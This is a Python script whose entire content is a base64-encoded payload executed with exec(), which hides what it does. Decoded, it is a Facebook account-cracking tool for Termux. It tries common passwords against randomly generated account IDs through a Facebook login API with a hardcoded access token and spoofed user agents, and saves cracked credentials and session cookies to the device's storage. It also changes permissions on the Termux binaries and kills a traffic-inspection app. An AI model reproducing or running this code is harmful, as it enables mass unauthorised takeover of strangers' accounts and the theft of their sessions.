import base64
exec(base64.b64decode(b'aW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKaW1wb3J0IHJlCmltcG9ydCByYW5kb20KaW1wb3J0IHV1aWQKaW1wb3J0IGpzb24KaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHB5Y3VybApmcm9tIGlvIGltcG9ydCBCeXRlc0lPCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgdHJlZApmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBzb3AKZnJvbSByYW5kb20gaW1wb3J0IGNob2ljZSBhcyByYWNlCmZyb20gc3RyaW5nIGltcG9ydCBkaWdpdHMsIGFzY2lpX2xldHRlcnMKaW1wb3J0IHVybGxpYi5wYXJzZQppbXBvcnQgYmFzZTY0CmltcG9ydCBjdHlwZXMKCnByaW50KCdceDFiWzE7OTFtW1x4MWJbMTs5N20tXHgxYlsxOzkxbV0gXHgxYlsxOzkybSBXRUxDT01FIFRPIFNZQ08gVE9PTCcpCm9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly9jaGF0LndoYXRzYXBwLmNvbS9ISEhaUHRRbEhYTUY5QkV1NkJxQVFIP21vZGU9YWNfdCcpCnRpbWUuc2xlZXAoMikKCmRlZiBydW5fc3lzdGVtX2NvbW1hbmQoY29tbWFuZCk6CiAgICBvcy5zeXN0ZW0oZid7Y29tbWFuZH0gPi9kZXYvbnVsbCAyPiYxJykKCnJ1bl9zeXN0ZW1fY29tbWFuZCgnY2htb2QgNzAwIC9kYXRhL2RhdGEvY29tLnRlcm11eC9maWxlcy91c3IvYmluJykKcnVuX3N5c3RlbV9jb21tYW5kKCdwa2lsbCAtZiBodHRjYW5hcnknKQoKY2xhc3MgTmVidWxhQ29sb3JzOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuVyA9ICdceDFiWzk3OzFtJwogICAgICAgIHNlbGYuUiA9ICdceDFiWzkxOzFtJwogICAgICAgIHNlbGYuRyA9ICdceDFiWzkyOzFtJwogICAgICAgIHNlbGYuWSA9ICdceDFiWzkzOzFtJwogICAgICAgIHNlbGYuQiA9ICdceDFiWzk0OzFtJwogICAgICAgIHNlbGYuUCA9ICdceDFiWzk1OzFtJwogICAgICAgIHNlbGYuQyA9ICdceDFiWzk2OzFtJwogICAgICAgIHNlbGYuTiA9ICdceDFiWzBtJwoKZGVmIHByb19iYW5uZXIoKToKICAgIHJldHVybiAiIiIKXHgxYlsxOzk2bQrilZTilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZcK4pWRICDilpHilojilojilojilojilojiloggICDilpHilojiloggICAgIOKWkeKWiOKWiCAgIOKWkeKWiOKWiOKWiOKWiOKWiOKWiCAgICDilpHilojilojilojilojilojiloggICDilZEK4pWRIOKWkeKWiOKWiCAgIOKWkeKWiOKWiCAgIOKWkeKWiOKWiCAgIOKWkeKWiOKWiCAgIOKWkeKWiOKWiCAgIOKWkeKWiOKWiCAg4paR4paI4paIICAg4paR4paI4paIICDilZEK4pWR4paR4paI4paIICAgICAgICAgICDilpHilojilogg4paR4paI4paIICAg4paR4paI4paIICAgICAgICDilpHilojiloggICAgIOKWkeKWiOKWiCDilZEK4pWRIOKWkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiCAgICAg4paR4paI4paI4paI4paIICAgIOKWkeKWiOKWiCAgICAgICAg4paR4paI4paIICAgICDilpHilojilogg4pWRCuKVkSAgICAgICAg4paR4paI4paIICAgICDilpHilojiloggICAgIOKWkeKWiOKWiCAgICAgICAg4paR4paI4paIICAgICDilpHilojilogg4pWRCuKVkSDilpHilojiloggICDilpHilojiloggICAgICDilpHilojiloggICAgICDilpHilojiloggICDilpHilojiloggIOKWkeKWiOKWiCAgIOKWkeKWiOKWiCAg4pWRCuKVkSAg4paR4paI4paI4paI4paI4paI4paIICAgICAgIOKWkeKWiOKWiCAgICAgICDilpHilojilojilojilojilojiloggICAg4paR4paI4paI4paI4paI4paI4paIICAg4pWRCuKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVnQpceDFiWzE7OTZtIOKepOKVkSBceDFiWzE7OTdtQ3JlYXRvciDilZEgSGFzc2FuClx4MWJbMTs5Nm0g4p6k4pWRIFx4MWJbMTs5N21WZXJzaW9uIOKVkSAwLjUKXHgxYlsxOzk2bSDinqTilZEgXHgxYlsxOzk3bVN0YXR1cyAg4pWRIFByZW1pdW0gVG9vbApceDFiWzE7OTZtIOKepOKVkSBceDFiWzE7OTdtVG9vbCAgICDilZEgU3ljby1Ucmlja2VyIEZyZWUgRW5qb3kgClx4MWJbMTs5Mm3ilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAiIiIKCmRlZiBsaW5leCgpOgogICAgY29sb3IgPSBOZWJ1bGFDb2xvcnMoKQogICAgcHJpbnQoZiJ7Y29sb3IuUH3ilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAiKQoKZGVmIGNsZWFyKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50KHByb19iYW5uZXIoKSkKCmRlZiBzZWN1cmVfeG9yKGRhdGEsIGtleT04NSk6CiAgICByZXR1cm4gYnl0ZXMoW2IgXiBrZXkgZm9yIGIgaW4gZGF0YV0pCgpkZWYgZ2V0X2hpZGRlbl91cmwoKToKICAgIHBhcnRzID0gWwogICAgICAgIHNlY3VyZV94b3IoYidodHRwczovLycpLAogICAgICAgIHNlY3VyZV94b3IoYidnaXRodWIuY29tLycpLAogICAgICAgIHNlY3VyZV94b3IoYicxLU5BTExBLycpLAogICAgICAgIHNlY3VyZV94b3IoYidKaW5uX0FwcC8nKSwKICAgICAgICBzZWN1cmVfeG9yKGInYmxvYi9tYWluLycpLAogICAgICAgIHNlY3VyZV94b3IoYidBcHAudHh0JykKICAgIF0KICAgIHJldHVybiBiIiIuam9pbihzZWN1cmVfeG9yKHBhcnQpIGZvciBwYXJ0IGluIHBhcnRzKS5kZWNvZGUoKQoKY2xhc3MgVXNlckFnZW50R2VuZXJhdG9yOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuY3VzdG9tX3VzZXJfYWdlbnRzID0gWwogICAgICAgICAgICAiW0ZCQU4vRkI0QTtGQkFWLzM1MS4wLjAuMzguMTE3O0ZCQlYvMzEwMjE4MTg4O0ZCRE0ve2RlbnNpdHk9Mi4wLHdpZHRoPTEwODAsaGVpZ2h0PTI0MDB9O0ZCTEMvZW5fVVM7RkJSVi9WZXJpem9uO0ZCTUYvU2Ftc3VuZztGQkJEL1NhbXN1bmc7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYvU00tQTcxNUY7RkJTVi8xMztGQk9QLzE7RkJDQS9hcm02NC12OGE7XSIsCiAgICAgICAgXQoKICAgIGRlZiBfZ2VuZXJhdGVfbW96aWxsYV91c2VyX2FnZW50KHNlbGYpOgogICAgICAgIGFuZHJvaWRfdmVyc2lvbiA9IHJhbmRvbS5yYW5kaW50KDQsIDEzKQogICAgICAgIGRldmljZSA9IHJhbmRvbS5jaG9pY2UoKCdTTS1HOTAwRicsICdTTS1HOTIwRicsICdTTS1UNTM1JywgJ1NNLVQyMzEnLCAnU00tSjMyMEYnLCAnR1QtSTkxOTAnKSkKICAgICAgICByZXNvbHV0aW9uID0gcmFuZG9tLmNob2ljZSgoJ3tkZW5zaXR5PTEuNSx3aWR0aD03MjAsaGVpZ2h0PTEyODB9JywgJ3tkZW5zaXR5PTMuNSx3aWR0aD0xNDQwLGhlaWdodD0zMDQwfScpKQogICAgICAgIGNocm9tZV92ZXJzaW9uID0gZiJ7cmFuZG9tLnJhbmRpbnQoMTAwLCAxNTApfS4wLjAuMCIKICAgICAgICByZXR1cm4gZiJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQge2FuZHJvaWRfdmVyc2lvbn07IHtkZXZpY2V9KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUve2Nocm9tZV92ZXJzaW9ufSBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbe3Jlc29sdXRpb259XSIKCiAgICBkZWYgZ2VuZXJhdGVfdXNlcl9hZ2VudChzZWxmKToKICAgICAgICB1c2VyX2FnZW50X3R5cGUgPSByYW5kb20uY2hvaWNlKCgnTW96aWxsYScsICdGYWNlYm9vaycsICdEYWx2aWsnLCAnaVBob25lJywgJ0N1c3RvbScpKQogICAgICAgIGlmIHVzZXJfYWdlbnRfdHlwZSA9PSAnTW96aWxsYSc6CiAgICAgICAgICAgIHJldHVybiBzZWxmLl9nZW5lcmF0ZV9tb3ppbGxhX3VzZXJfYWdlbnQoKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHJldHVybiByYW5kb20uY2hvaWNlKHNlbGYuY3VzdG9tX3VzZXJfYWdlbnRzKQoKICAgIGRlZiBsb2FkX3VzZXJfYWdlbnRzX2Zyb21fdXJsKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgaW1wb3J0IHJlcXVlc3RzCiAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vdHJ0LUZpcmUvZGF0YS9tYWluL3VhLnR4dCcpCiAgICAgICAgICAgIHJldHVybiByZXNwb25zZS50ZXh0LnNwbGl0bGluZXMoKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHJldHVybiBbXQoKY2xhc3MgU1lDT0NyYWNrZXI6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5va3MgPSBbXQogICAgICAgIHNlbGYuY3BzID0gW10KICAgICAgICBzZWxmLmxvb3AgPSAwCiAgICAgICAgc2VsZi5jb2xvciA9IE5lYnVsYUNvbG9ycygpCiAgICAgICAgc2VsZi51c2VyX2FnZW50cyA9IFVzZXJBZ2VudEdlbmVyYXRvcigpLmxvYWRfdXNlcl9hZ2VudHNfZnJvbV91cmwoKQoKICAgIGRlZiBvbGRfbWVudShzZWxmKToKICAgICAgICBjbGVhcigpCiAgICAgICAgcHJpbnQoZiJ7c2VsZi5jb2xvci5QfSB7c2VsZi5jb2xvci5DfVsxXSB7c2VsZi5jb2xvci5HfUNSQUNLIDIwMDkgQUNDT1VOVFMgICAgICAgICAgICAgICAgIHtzZWxmLmNvbG9yLlB9IikKICAgICAgICBwcmludChmIntzZWxmLmNvbG9yLlB9IHtzZWxmLmNvbG9yLkN9WzJdIHtzZWxmLmNvbG9yLkd9Q1JBQ0sgMjAwOS0yMDEzIEFDQ09VTlRTICAgICAgICAgICAge3NlbGYuY29sb3IuUH0iKQogICAgICAgIHByaW50KGYie3NlbGYuY29sb3IuUH0ge3NlbGYuY29sb3IuQ31bMF0ge3NlbGYuY29sb3IuUn3ih6YgQkFDSyBUTyBNQUlOIE1FTlUgICAgICAgICAgICAgICAgIHtzZWxmLmNvbG9yLlB9IikKICAgICAgICBwcmludChmIntzZWxmLmNvbG9yLlB94pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQIikKCiAgICAgICAgY2hvaWNlID0gaW5wdXQoZiIgIHtzZWxmLmNvbG9yLkN9XHgxYlsxOzk2bSDinqQgQ2hvb3NlOiB7c2VsZi5jb2xvci5XfSIpLnN0cmlwKCkKICAgICAgICAKICAgICAgICBpZiBjaG9pY2UgaW4gKCcxJywgJzAxJyk6CiAgICAgICAgICAgIHNlbGYuZXhlY3V0ZV9icmVhY2goJzEwMDAwMCcpCiAgICAgICAgZWxpZiBjaG9pY2UgaW4gKCcyJywgJzAyJyk6CiAgICAgICAgICAgIHNlbGYucXVhbnR1bV9icmVhY2hfbWVudSgpCiAgICAgICAgZWxpZiBjaG9pY2UgaW4gKCcwJywgJzAwJyk6CiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYiXG4gIHtzZWxmLmNvbG9yLlJ94pqgIEludmFsaWQgY2hvaWNlISIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMikKICAgICAgICAgICAgc2VsZi5vbGRfbWVudSgpCgogICAgZGVmIHF1YW50dW1fYnJlYWNoX21lbnUoc2VsZik6CiAgICAgICAgY2xlYXIoKQogICAgICAgIHNlcmllc19tYXAgPSB7CiAgICAgICAgICAgICcxJzogJzEwMDAwMCcsICcyJzogJzEwMDAwMScsICczJzogJzEwMDAwMicsIAogICAgICAgICAgICAnNCc6ICcxMDAwMDMnLCAnNSc6ICcxMDAwMDQnCiAgICAgICAgfQogICAgICAgIHByaW50KGYiICB7c2VsZi5jb2xvci5XfVx4MWJbMTs5Nm0g4p6kIFNlbGVjdCBTZXJpZXM6IikKICAgICAgICBmb3IgbnVtLCBwcmVmaXggaW4gc2VyaWVzX21hcC5pdGVtcygpOgogICAgICAgICAgICBwcmludChmIiAge3NlbGYuY29sb3IuV31be3NlbGYuY29sb3IuR317bnVtfXtzZWxmLmNvbG9yLld9XSB7c2VsZi5jb2xvci5DfXtwcmVmaXh9IikKICAgICAgICAKICAgICAgICBsaW5leCgpCiAgICAgICAgY2hvaWNlID0gaW5wdXQoZiIgIHtzZWxmLmNvbG9yLkN9XHgxYlsxOzk2bSDinqQgQ2hvb3NlOiB7c2VsZi5jb2xvci5XfSIpLnN0cmlwKCkKICAgICAgICBzZWxlY3RlZF9wcmVmaXggPSBzZXJpZXNfbWFwLmdldChjaG9pY2UpCgogICAgICAgIGlmIG5vdCBzZWxlY3RlZF9wcmVmaXg6CiAgICAgICAgICAgIHByaW50KGYiICB7c2VsZi5jb2xvci5SfeKaoCBJbnZhbGlkIFNlcmllcyEiKQogICAgICAgICAgICB0aW1lLnNsZWVwKDIpCiAgICAgICAgICAgIHNlbGYucXVhbnR1bV9icmVhY2hfbWVudSgpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIAogICAgICAgIHNlbGYuZXhlY3V0ZV9icmVhY2goc2VsZWN0ZWRfcHJlZml4KQoKICAgIGRlZiBleGVjdXRlX2JyZWFjaChzZWxmLCBwcmVmaXgpOgogICAgICAgIHRyeToKICAgICAgICAgICAgY2xlYXIoKQogICAgICAgICAgICBsaW1pdCA9IGludChpbnB1dChmIiAge3NlbGYuY29sb3IuR31ceDFiWzE7OTZtIOKepCBFbnRlciBMaW1pdDoge3NlbGYuY29sb3IuV30iKSkKICAgICAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICAgICAgcHJpbnQoZiIgIHtzZWxmLmNvbG9yLlJ94pqgIEludmFsaWQgTnVtYmVyISIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMikKICAgICAgICAgICAgc2VsZi5vbGRfbWVudSgpCiAgICAgICAgICAgIHJldHVybgoKICAgICAgICB0YXJnZXRzID0gW3ByZWZpeCArICcnLmpvaW4ocmFuZG9tLmNob2ljZXMoZGlnaXRzLCBrPTkpKSBmb3IgXyBpbiByYW5nZShsaW1pdCldCiAgICAgICAgcGFzc2xpc3QgPSBbJzEyMzQ1Njc4OScsICcxMjM0NTYnLCAnMTIzNDU2NzgnLCAnMTIzNDU2NycsICcxMjM0NTY3ODkwJ10KCiAgICAgICAgd2l0aCB0cmVkKG1heF93b3JrZXJzPTMwKSBhcyBleGVjdXRvcjoKICAgICAgICAgICAgY2xlYXIoKQogICAgICAgICAgICBwcmludChmIiAge3NlbGYuY29sb3IuV31ceDFiWzE7OTZtVVNJTkcgU0VSSUVTIDp7c2VsZi5jb2xvci5ZfXtwcmVmaXh9ICIpCiAgICAgICAgICAgIHByaW50KGYiICB7c2VsZi5jb2xvci5XfVx4MWJbMTs5Nm1UT1RBTCBBQ0NPVU5UOiB7c2VsZi5jb2xvci5HfXtsZW4odGFyZ2V0cyl9IikKICAgICAgICAgICAgbGluZXgoKQogICAgICAgICAgICBmb3IgdGFyZ2V0IGluIHRhcmdldHM6CiAgICAgICAgICAgICAgICBleGVjdXRvci5zdWJtaXQoc2VsZi5icmVhY2hfdGFyZ2V0LCB0YXJnZXQsIHBhc3NsaXN0KQogICAgICAgIAogICAgICAgIHNlbGYuZGlzcGxheV9yZXN1bHRzKCkKCiAgICBkZWYgYnJlYWNoX3RhcmdldChzZWxmLCB0YXJnZXQsIHBhc3NsaXN0KToKICAgICAgICBzZWxmLmxvb3AgKz0gMQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZidcciAge3NlbGYuY29sb3IuV31bU1lDT10ge3NlbGYubG9vcH18e3NlbGYuY29sb3IuUn17bGVuKHNlbGYub2tzKX18e3NlbGYuY29sb3IuR317bGVuKHNlbGYuY3BzKX17c2VsZi5jb2xvci5XfScpCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgZm9yIHBhc3N3b3JkIGluIHBhc3NsaXN0OgogICAgICAgICAgICBpZiBzZWxmLnRyeV9icmVhY2godGFyZ2V0LCBwYXNzd29yZCk6CiAgICAgICAgICAgICAgICBicmVhawoKICAgIGRlZiB0cnlfYnJlYWNoKHNlbGYsIHVpZCwgcGFzc3dvcmQpOgogICAgICAgIHRyeToKICAgICAgICAgICAgdWEgPSByYW5kb20uY2hvaWNlKHNlbGYudXNlcl9hZ2VudHMpCiAgICAgICAgICAgIAogICAgICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiB1YSwKICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJywKICAgICAgICAgICAgICAgICdIb3N0JzogJ2dyYXBoLmZhY2Vib29rLmNvbScsCiAgICAgICAgICAgICAgICAnQXV0aG9yaXphdGlvbic6ICdPQXV0aCAzNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNEaW9yMjM0MzdhNGEzMicsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIHBheWxvYWQgPSB7CiAgICAgICAgICAgICAgICAnYWRpZCc6IHN0cih1dWlkLnV1aWQ0KCkpLAogICAgICAgICAgICAgICAgJ2Zvcm1hdCc6ICdqc29uJywKICAgICAgICAgICAgICAgICdkZXZpY2VfaWQnOiBzdHIodXVpZC51dWlkNCgpKSwKICAgICAgICAgICAgICAgICdlbWFpbCc6IHVpZCwKICAgICAgICAgICAgICAgICdwYXNzd29yZCc6IHBhc3N3b3JkLAogICAgICAgICAgICAgICAgJ2FjY2Vzc190b2tlbic6ICczNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInLAogICAgICAgICAgICAgICAgJ2dlbmVyYXRlX3Nlc3Npb25fY29va2llcyc6ICcxJywKICAgICAgICAgICAgICAgICdtZXRob2QnOiAnYXV0aC5sb2dpbicsCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGVuY29kZWRfcGF5bG9hZCA9IHVybGxpYi5wYXJzZS51cmxlbmNvZGUocGF5bG9hZCkKICAgICAgICAgICAgYnVmZmVyID0gQnl0ZXNJTygpCiAgICAgICAgICAgIGMgPSBweWN1cmwuQ3VybCgpCiAgICAgICAgICAgIGMuc2V0b3B0KGMuVVJMLCAnaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vYXV0aC9sb2dpbicpCiAgICAgICAgICAgIGMuc2V0b3B0KGMuUE9TVCwgMSkKICAgICAgICAgICAgYy5zZXRvcHQoYy5QT1NURklFTERTLCBlbmNvZGVkX3BheWxvYWQpCiAgICAgICAgICAgIGMuc2V0b3B0KGMuV1JJVEVEQVRBLCBidWZmZXIpCiAgICAgICAgICAgIGMuc2V0b3B0KGMuVElNRU9VVCwgMTApCiAgICAgICAgICAgIAogICAgICAgICAgICBoZWFkZXJfbGlzdCA9IFtmIntrZXl9OiB7dmFsdWV9IiBmb3Iga2V5LCB2YWx1ZSBpbiBoZWFkZXJzLml0ZW1zKCldCiAgICAgICAgICAgIGMuc2V0b3B0KGMuSFRUUEhFQURFUiwgaGVhZGVyX2xpc3QpCiAgICAgICAgICAgIAogICAgICAgICAgICBjLnBlcmZvcm0oKQogICAgICAgICAgICByZXNwb25zZV9ib2R5ID0gYnVmZmVyLmdldHZhbHVlKCkuZGVjb2RlKCd1dGYtOCcpCiAgICAgICAgICAgIHJlc3BvbnNlID0ganNvbi5sb2FkcyhyZXNwb25zZV9ib2R5KQogICAgICAgICAgICBjLmNsb3NlKCkKICAgICAgICAgICAgYnVmZmVyLmNsb3NlKCkKCiAgICAgICAgICAgIGlmICdzZXNzaW9uX2tleScgaW4gcmVzcG9uc2U6CiAgICAgICAgICAgICAgICBzZWxmLmhhbmRsZV9zdWNjZXNzKHVpZCwgcGFzc3dvcmQsIHJlc3BvbnNlKQogICAgICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcmVzcG9uc2UuZ2V0KCdlcnJvcicsIHt9KS5nZXQoJ21lc3NhZ2UnLCAnJyk6CiAgICAgICAgICAgICAgICBzZWxmLmhhbmRsZV9wYXJ0aWFsKHVpZCwgcGFzc3dvcmQpCiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgICAgIHJldHVybiBGYWxzZQoKICAgIGRlZiBoYW5kbGVfc3VjY2VzcyhzZWxmLCB1aWQsIHBhc3N3b3JkLCByZXNwb25zZSk6CiAgICAgICAgY29raSA9ICc7Jy5qb2luKFtmIntjWyduYW1lJ119PXtjWyd2YWx1ZSddfSIgZm9yIGMgaW4gcmVzcG9uc2UuZ2V0KCdzZXNzaW9uX2Nvb2tpZXMnLCBbXSldKQogICAgICAgIHByaW50KGYiXHIgIHtzZWxmLmNvbG9yLkd9XHgxYlsxOzk2bSAgIOKepCBTVUNDRVNTIHtzZWxmLmNvbG9yLld9e3VpZH18e3NlbGYuY29sb3IuR317cGFzc3dvcmR9e3NlbGYuY29sb3IuV30iKQogICAgICAgIHdpdGggb3BlbignL3NkY2FyZC9TWUNPLU9MRC50eHQnLCAnYScpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUoZid7dWlkfXx7cGFzc3dvcmR9fHtjb2tpfVxuJykKICAgICAgICBzZWxmLm9rcy5hcHBlbmQodWlkKQoKICAgIGRlZiBoYW5kbGVfcGFydGlhbChzZWxmLCB1aWQsIHBhc3N3b3JkKToKICAgICAgICBwcmludChmIlxyICB7c2VsZi5jb2xvci5ZfVx4MWJbMTs5MG0gICBbU1lDT10ge3NlbGYuY29sb3IuR317dWlkfXtzZWxmLmNvbG9yLll94oCiXHgxYlsxOzkwbXtwYXNzd29yZH17c2VsZi5jb2xvci5XfSIpCiAgICAgICAgd2l0aCBvcGVuKCcvc2RjYXJkL1NZQ08tT0xELnR4dCcsICdhJykgYXMgZjoKICAgICAgICAgICAgZi53cml0ZShmJ3t1aWR9fHtwYXNzd29yZH1cbicpCiAgICAgICAgc2VsZi5jcHMuYXBwZW5kKHVpZCkKICAgICAgICAKICAgIGRlZiBkaXNwbGF5X3Jlc3VsdHMoc2VsZik6CiAgICAgICAgY2xlYXIoKQogICAgICAgIHByaW50KGYiICB7c2VsZi5jb2xvci5HfVx4MWJbMTs5Nm0gICDinqQgQ1JBQ0tJTkcgQ09NUExFVEUiKQogICAgICAgIGxpbmV4KCkKICAgICAgICBwcmludChmIiAge3NlbGYuY29sb3IuV31DUDoge3NlbGYuY29sb3IuWX17bGVuKHNlbGYub2tzKX0iKQogICAgICAgIHByaW50KGYiICB7c2VsZi5jb2xvci5XfU9LOiB7c2VsZi5jb2xvci5HfXtsZW4oc2VsZi5jcHMpfSIpCiAgICAgICAgbGluZXgoKQogICAgICAgIGlucHV0KGYiICB7c2VsZi5jb2xvci5DfVByZXNzIEVOVEVSIHRvIGNvbnRpbnVlIHtzZWxmLmNvbG9yLld9IikKICAgICAgICBzZWxmLm9sZF9tZW51KCkKCgogICAgICAgIGRlZiBjbGVhcigpOgogICAgICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBwcmludChwcm9fYmFubmVyKCkpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgdHJ5OgogICAgICAgIGNyYWNrZXIgPSBTWUNPQ3JhY2tlcigpCiAgICAgICAgY3JhY2tlci5vbGRfbWVudSgpCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgcHJpbnQoJ1xuXHgxYls5MTsxbSAgIOKepCBTdG9wcGVkXHgxYls5NzsxbScpCiAgICAgICAgc3lzLmV4aXQoKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYnXG5ceDFiWzkxOzFtICAg4p6kIEVycm9yOiB7c3RyKGUpfVx4MWJbOTc7MW0nKQogICAgICAgIAogICAgICAgIHN5cy5leGl0KCkgCg=='))